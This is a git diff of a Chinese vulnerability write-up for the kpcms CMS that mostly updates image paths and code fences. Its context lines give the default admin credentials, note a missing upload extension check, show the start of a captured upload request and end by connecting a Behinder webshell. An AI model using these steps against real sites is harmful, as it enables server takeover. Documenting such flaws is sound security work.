@@ -18,31 +18,29 @@ https://gitee.com/qingzhanwang/kpcms
 
 登录页面如下, 默认账号密码为 **admin/admin**
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/admin.php/index/login.html
 ```
 
-
-
-![](images/202202170921790.png)
+![](../.gitbook/assets/202202170921790.png)
 
 源码中没有对上传文件的后缀检测
 
-```plain
+```
 thinkphp/library/think/File.php
 ```
 
-![](images/202202170922307.png)
+![](../.gitbook/assets/202202170922307.png)
 
 任意找一处文件上传点
 
-![](images/202202170922296.png)
+![](../.gitbook/assets/202202170922296.png)
 
 上传抓包获取文件地址
 
-![](images/202202170922533.png)
+![](../.gitbook/assets/202202170922533.png)
 
-```plain
+```
 POST /admin.php/index/upload.html?dir=image HTTP/1.1
 Host: 192.168.1.108:88
 Content-Length: 935
@@ -101,4 +99,4 @@ session_start();
 
 连接冰蝎木马即可
 
-![](images/202202170922800.png)
+![](../.gitbook/assets/202202170922800.png)
